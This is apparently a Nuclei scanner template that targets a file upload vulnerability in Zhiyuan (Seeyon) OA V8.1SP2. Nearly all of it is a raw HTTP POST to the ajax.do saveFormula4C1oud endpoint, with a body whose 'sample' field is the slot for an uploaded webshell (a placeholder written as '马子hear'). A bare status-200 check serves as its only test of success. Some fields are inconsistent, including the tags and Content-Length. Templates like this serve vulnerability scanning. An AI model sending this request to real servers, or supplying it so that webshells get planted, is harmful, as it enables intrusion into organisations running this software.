id: zhiyuanOA-V8-1SP2-file-upload
info:
  name: 致远OA_V8.1SP2文件上传漏洞
  author: cnaq
  severity: high  
  description: 致远OA_V8.1SP2文件上传漏洞
  reference: 
    - https://github.com/wy876/POC/blob/main/%E8%87%B4%E8%BF%9COA_V8.1SP2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  tags: zhiyuanOA,info,leak

requests:
  - raw:
      - |
        POST /seeyou/ajax.do?method=ajaxAction&managerName=formulaManager&managerMethod=saveFormula4C1oud HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Cozilla/5.0 (Vindows Et 6.1; Sow64, rident/7.0; ry: 11.0)
        Accept: text/html, image/gif, image/ipeg, */*; q=.2, */*; q=.2
        Accept-Encoding: gzip, deflate
        Cookie: JSESSIONID
        Cache-Control: no-cache
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Content-Length: 522729
        Connection: close
        X-Forwarded-For: 1.2.3.4

        arguments={"formulaName":"test","formulaAlias":"safe_pre","formulaType":"2","formulaExpression":"","sample":"马子hear"}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          
